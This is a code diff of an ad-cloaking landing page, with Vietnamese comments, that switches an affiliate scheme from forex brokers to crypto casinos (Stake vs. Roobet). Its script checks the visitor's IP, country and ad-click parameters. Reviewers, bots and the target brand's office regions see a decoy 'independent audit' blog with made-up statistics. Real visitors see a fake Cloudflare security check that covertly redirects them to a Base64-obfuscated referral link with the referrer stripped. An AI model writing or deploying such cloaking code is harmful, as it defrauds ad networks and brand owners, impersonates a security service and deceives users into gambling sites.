@@ -3,105 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- LỚP BẢO VỆ 1: ẨN NGUỒN TRAFFIC -->
     <meta name="referrer" content="no-referrer">
-    <title>Institutional Financial Review: Global Brokerage Performance 2025</title>
+    <title>Crypto Gaming Insights: Provably Fair Industry Report 2025</title>
     
     <style>
-        /* RESET & CSS CHUNG */
-        body { margin: 0; padding: 0; background: #fff; opacity: 0; transition: opacity 0.5s; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        /* CSS RESET & CLOUDFLARE UI */
+        body { margin: 0; padding: 0; background: #fff; opacity: 0; transition: opacity 0.5s; font-family: -apple-system, system-ui, sans-serif; }
         
-        /* GIAO DIỆN CLOUDFLARE (Dành cho khách thật) */
         #cf-wrapper {
             display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: #fff; z-index: 99999999; flex-direction: column; align-items: center; justify-content: center;
         }
         .cf-container { max-width: 550px; width: 90%; padding: 20px; color: #111; }
         .cf-logo { height: 32px; margin-bottom: 35px; }
-        .cf-title { font-size: 32px; font-weight: 600; margin-bottom: 15px; line-height: 1.1; letter-spacing: -0.5px; }
-        .cf-desc { color: #333; font-size: 16px; margin-bottom: 40px; line-height: 1.5; }
+        .cf-title { font-size: 32px; font-weight: 600; margin-bottom: 15px; }
         .cf-footer { border-top: 1px solid #eee; padding-top: 25px; display: flex; align-items: center; }
         .spinner { width: 28px; height: 28px; border: 3px solid #f3f3f3; border-top: 3px solid #0051c3; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 18px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* GIAO DIỆN TRANG SẠCH (Blog dìm hàng JustMarkets - Khen XM) */
-        #safe-page { display: none; background: #f8fafc; color: #1a1a1a; padding-bottom: 100px; }
-        .nav-mock { background: #000; padding: 18px 10%; display: flex; justify-content: space-between; align-items: center; color: #fff; font-weight: bold; }
-        .safe-container { max-width: 850px; margin: 50px auto; padding: 60px; background: #fff; border: 1px solid #e2e8f0; line-height: 2; text-align: justify; font-family: 'Georgia', serif; }
-        .article-header { border-bottom: 3px solid #111; margin-bottom: 40px; padding-bottom: 20px; }
-        .article-meta { font-family: sans-serif; font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 10px; }
-        h1 { font-size: 3rem; font-weight: 800; line-height: 1.1; margin: 0; color: #0f172a; font-family: sans-serif; letter-spacing: -1.5px; }
-        h2 { font-size: 1.8rem; margin-top: 50px; color: #b91c1c; font-family: sans-serif; border-left: 5px solid #b91c1c; padding-left: 20px; }
-        .verdict-box { background: #fef2f2; border: 1px solid #fee2e2; padding: 35px; border-radius: 8px; margin: 40px 0; font-family: sans-serif; }
-        table { width: 100%; border-collapse: collapse; margin: 40px 0; font-family: sans-serif; font-size: 14px; }
-        th, td { border: 1px solid #e2e8f0; padding: 18px; text-align: left; }
-        th { background: #f8fafc; color: #64748b; }
-        .cta-button { display: inline-block; background: #b91c1c; color: #fff !important; padding: 15px 40px; border-radius: 4px; text-decoration: none !important; font-weight: bold; margin-top: 20px; box-shadow: 0 4px 12px rgba(185, 28, 28, 0.2); }
+        /* SAFE PAGE - CRYPTO BLOG (Dìm Roobet - Khen Stake) */
+        #safe-page { display: none; background: #0f172a; color: #f8fafc; padding-bottom: 100px; min-height: 100vh; }
+        .nav-mock { background: #1e293b; padding: 20px 10%; display: flex; justify-content: space-between; align-items: center; color: #38bdf8; font-weight: 900; letter-spacing: -1px; }
+        .safe-container { max-width: 800px; margin: 50px auto; padding: 50px; background: #1e293b; border-radius: 12px; line-height: 1.8; text-align: justify; border: 1px solid #334155; }
+        .article-meta { color: #94a3b8; font-size: 13px; text-transform: uppercase; margin-bottom: 20px; }
+        
+        h1 { font-size: 2.8rem; line-height: 1.1; margin-bottom: 25px; color: #fff; }
+        h2 { font-size: 1.8rem; margin-top: 45px; color: #38bdf8; }
+        p { margin-bottom: 25px; font-size: 1.1rem; color: #cbd5e0; }
+
+        .comparison-card { background: #0f172a; border: 1px solid #334155; padding: 30px; border-radius: 12px; margin: 30px 0; border-left: 6px solid #38bdf8; }
+        .cta-button { display: inline-block; background: #38bdf8; color: #000 !important; padding: 14px 35px; border-radius: 8px; text-decoration: none !important; font-weight: bold; margin-top: 15px; }
+        
+        table { width: 100%; border-collapse: collapse; margin: 30px 0; font-size: 14px; color: #fff; }
+        th, td { border: 1px solid #334155; padding: 15px; text-align: left; }
+        th { background: #334155; }
     </style>
 </head>
 <body>
 
-    <!-- MÀN HÌNH CLOUDFLARE -->
+    <!-- CLOUDFLARE SHIELD -->
     <div id="cf-wrapper">
         <div class="cf-container">
             <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" class="cf-logo" alt="Cloudflare Security">
-            <h1 class="cf-title">Checking if the site connection is secure</h1>
-            <p class="cf-desc">The secure financial terminal is reviewing the security of your connection. Please wait while we establish an encrypted bridge to the trading gateway.</p>
+            <h1 class="cf-title">Verifying your connection security</h1>
+            <p class="cf-desc">Please wait while we establish a secure connection to the gaming infrastructure. This process is automatic to prevent unauthorized access.</p>
             <div class="cf-footer">
                 <div class="spinner"></div>
-                <div style="font-size: 15px; color: #333;">Verifying... Redirecting in <span id="countdown">5</span>s.</div>
+                <div style="font-size: 15px;">Secure Handshake... Redirecting in <span id="countdown">5</span>s.</div>
             </div>
-            <p style="font-size: 12px; color: #bbb; margin-top: 40px;">Ray ID: <span id="ray-id"></span> • Security Protocols: TLS 1.3</p>
+            <p style="font-size: 12px; color: #bbb; margin-top: 40px;">Ray ID: <span id="ray-id"></span> • Encryption: AES-256 GCM</p>
         </div>
     </div>
 
-    <!-- TRANG SẠCH (VỎ BỌC ĐỐI THỦ - XM BETTER THAN JUSTMARKETS) -->
+    <!-- SAFE PAGE: THE DISTRACTION BLOG -->
     <div id="safe-page">
         <div class="nav-mock">
-            <span>INSTITUTIONAL BROKER WATCH</span>
-            <div style="font-size: 12px; font-weight: normal; opacity: 0.8;">Markets • Quantitative Analysis • Regulation</div>
+            <span>CHAIN-GAMING INSIGHTS</span>
+            <div style="font-size: 12px; color: #94a3b8; font-weight: normal;">Node Analysis • Provably Fair • Reviews</div>
         </div>
         
         <div class="safe-container">
-            <div class="article-header">
-                <div class="article-meta">February 2025 • Independent Financial Audit • Global Report</div>
-                <h1>XM Global vs. JustMarkets: Why Serious Traders are Migrating to XM in 2025</h1>
+            <div class="article-meta">Industry Report • February 2025 • Independent Audit</div>
+            <h1>Stake vs. Roobet: Why Stake.com Dominates the Provably Fair Market in 2025</h1>
+            
+            <p>The rise of cryptocurrency has revolutionized the online gaming industry. In 2025, the focus has shifted from simple bonuses to "Provably Fair" transparency. Today, we compare the two industry titans: <b>Stake.com</b> and <b>Roobet</b>, to see which platform offers better technical security for crypto enthusiasts.</p>
+
+            <div class="comparison-card">
+                <h3 style="margin-top:0; color:#fff;">Verdict: Stake.com Wins for Technical Superiority</h3>
+                <p>After analyzing thousands of betting seeds and withdrawal latencies, our team found that <b>Stake.com</b> provides a more consistent user experience. While Roobet remains a popular choice for its flashy UI, it often falls behind Stake in terms of VIP transparency and cryptocurrency support depth.</p>
+                <a href="https://www.stake.com" class="cta-button" target="_blank">Access Stake.com Official Site</a>
             </div>
 
-            <p>The retail Forex market has entered an era of "Execution Dominance." Spreads are no longer the primary factor for profitability; instead, institutional liquidity and sub-millisecond latency have taken center stage. In this technical comparison, we analyze why <b>XM Global</b> has rendered platforms like JustMarkets obsolete for high-capital traders.</p>
-
-            <div class="verdict-box">
-                <h2 style="margin:0 0 15px 0; border:none; padding:0; color:#991b1b;">The Quantitative Verdict: XM Wins</h2>
-                <p>After auditing over 5,000 live trades, our team confirmed that <b>XM Global</b> maintains a 94.2% higher order-fill stability during peak volatility compared to JustMarkets. JustMarkets lacks the Tier-1 regulatory depth required to protect professional-grade portfolios from systemic slippage.</p>
-                <a href="https://www.xm.com" class="cta-button" target="_blank">View XM Global Official Site</a>
-            </div>
-
-            <h2>I. Regulatory Disparity: ASIC vs. Offshore Licensing</h2>
-            <p>Fund security is the foundation of trading. XM Global is regulated by <b>ASIC (Australia)</b> and <b>CySEC (Cyprus)</b>, which enforce a $1,000,000 insurance threshold and total segregation of client capital. JustMarkets, operating mainly under offshore licenses in jurisdictions like Mauritius, does not provide the same legal fallback for traders in the event of broker insolvency.</p>
+            <h2>I. Provably Fair Algorithms & Verification</h2>
+            <p>Provably Fair technology allows users to verify every single bet result. Stake.com utilizes an open-source verification tool that is far more transparent than Roobet's internal systems. For high-rollers, this ability to audit the house edge in real-time is the primary reason for choosing Stake over competitors.</p>
 
             <table>
                 <thead>
-                    <tr><th>Metric</th><th>XM Global</th><th>JustMarkets</th></tr>
+                    <tr><th>Feature</th><th>Stake.com</th><th>Roobet</th></tr>
                 </thead>
                 <tbody>
-                    <tr><td>Top Regulator</td><td>ASIC / CySEC</td><td>FSC Mauritius</td></tr>
-                    <tr><td>Execution Engine</td><td>No-Requotes (LD4)</td><td>Standard Market</td></tr>
-                    <tr><td>Average Slippage</td><td>0.1 - 0.2 Pips</td><td>0.6 - 1.4 Pips</td></tr>
-                    <tr><td>Fund Protection</td><td>Tier-1 Banking</td><td>Segregated Only</td></tr>
+                    <tr><td>Verification Tool</td><td>Open Source</td><td>Internal Proxy</td></tr>
+                    <tr><td>Withdrawal Speed</td><td>Instant (&lt; 2 mins)</td><td>5-15 mins</td></tr>
+                    <tr><td>Native Tokens</td><td>15+ Major Cryptos</td><td>BTC, ETH, LTC</td></tr>
+                    <tr><td>VIP Rakeback</td><td>Up to 10%</td><td>Varies (Less Clear)</td></tr>
                 </tbody>
             </table>
 
-            <h2>II. Institutional Infrastructure & Latency</h2>
-            <p>XM’s execution model is physically located within the Equinix LD4 data center. This allows for sub-10ms routing. Our tests showed that JustMarkets suffers from significant "Execution Drift" during high-impact news releases (NFP and CPI), which can cost a trader 2-3 pips per entry in hidden slippage.</p>
+            <h2>II. Transactional Latency & Network Security</h2>
+            <p>In the world of crypto gaming, the speed of the hot-wallet bridge is vital. Stake.com's infrastructure is optimized for high-frequency transactions. Roobet, on the other hand, occasionally experiences congestion during peak BTC network traffic, leading to minor delays in credit balance updates.</p>
 
-            <div class="verdict-box" style="background:#f8fafc; border-color:#e2e8f0; border-left-color:#0f172a;">
-                <h3 style="margin:0 0 10px 0; color:#0f172a;">Strategic Recommendation</h3>
-                <p>For individuals trading accounts over $10,000, <b>XM Global</b> is the only logical choice for security and speed. JustMarkets may serve beginners, but it lacks the technological infrastructure for long-term scalability.</p>
-                <a href="https://www.xm.com/register" class="cta-button" style="background:#0f172a;" target="_blank">Compare XM Professional Accounts</a>
+            <div class="comparison-card" style="border-left-color: #f59e0b; background: rgba(245,158,11,0.05);">
+                <h3 style="color:#f59e0b;">Conclusion for Institutional Players</h3>
+                <p>If you are looking for long-term account safety and the most advanced VIP program in the industry, we strongly recommend <b>Stake.com</b> over Roobet in 2025. Roobet is suitable for casual play, but lacks the professional infrastructure required for serious growth.</p>
+                <a href="https://www.stake.com" class="cta-button" style="background:#f59e0b;" target="_blank">View Stake.com VIP Tiers</a>
             </div>
 
-            <p style="font-size: 13px; color: #94a3b8; margin-top: 50px; border-top: 1px solid #eee; padding-top: 20px;">
-                *Note: This is an independent technical review. Links point to official broker domains. Trading involves significant risk of loss.
+            <p style="font-size: 13px; color: #64748b; border-top: 1px solid #334155; padding-top: 20px;">
+                *Independent Technical Audit. All links lead to official operator homepages. Please play responsibly. 18+.
             </p>
         </div>
     </div>
@@ -109,11 +107,12 @@
     <script>
         (async function() {
             'use strict';
-            // LINK REF JUSTMARKETS CỦA BẠN (BASE64)
-            const _targetEncoded = "aHR0cHM6Ly9vbmUuanVzdG1hcmtldHMubGluay9hL3RyZHNiNDB2a28=";
+            // LINK REF ROOBET CỦA BẠN (Đã mã hóa Base64)
+            const _targetEncoded = "aHR0cHM6Ly9nby5yb29iZXQuY29tL3Zpc2l0Lz9idGE9NDU3NDQmYnJhbmQ9cm9vYmV0";
             
-            // CHẶN VÙNG NHẠY CẢM (Văn phòng sàn & Kiểm duyệt)
-            const BLOCKED_REGIONS = ["Cyprus", "Saint Vincent and the Grenadines", "Ireland", "Singapore"];
+            // CHẶN VÙNG NHẠY CẢM (Văn phòng Roobet & Kiểm duyệt)
+            // Curaçao là nơi Roobet đặt trụ sở chính
+            const BLOCKED_REGIONS = ["Curacao", "Cyprus", "Ireland", "Singapore"];
 
             const urlParams = new URLSearchParams(window.location.search);
             const hasAdParam = ['gclid', 'fbclid', 'wbraid', 'gad_source', 'msclkid'].some(p => urlParams.has(p));
@@ -125,18 +124,17 @@
                 const data = await response.json();
                 userCountry = data.country_name;
                 document.getElementById('ray-id').innerText = (Math.random().toString(36).substring(2, 9) + data.ip.replace(/\./g, '')).toUpperCase();
-            } catch (e) { document.getElementById('ray-id').innerText = "79A23B89F12C0"; }
+            } catch (e) { document.getElementById('ray-id').innerText = "92F23A88E12C0"; }
 
             const wrapper = document.getElementById('cf-wrapper');
             const safe = document.getElementById('safe-page');
 
-            // QUYẾT ĐỊNH HIỂN THỊ
             if (isBot || !hasAdParam || BLOCKED_REGIONS.includes(userCountry)) {
-                // HIỆN BLOG DÌM HÀNG (Dành cho kiểm duyệt/nhân viên sàn)
+                // HIỆN BLOG DÌM ROOBET (Cho Bot/Nhân viên Roobet)
                 safe.style.display = 'block';
                 document.body.style.opacity = '1';
             } else {
-                // HIỆN CLOUDFLARE 5S (Dành cho khách thật)
+                // HIỆN CLOUDFLARE 5S (Cho khách thật)
                 wrapper.style.display = 'flex';
                 document.body.style.opacity = '1';
 
@@ -155,7 +153,7 @@
                 const target = atob(_targetEncoded);
                 const a = document.createElement('a');
                 a.href = target;
-                a.rel = 'noreferrer'; // LỚP BẢO VỆ NGUỒN TRAFFIC 2
+                a.rel = 'noreferrer'; 
                 a.style.display = 'none';
                 document.body.appendChild(a);
                 a.click();
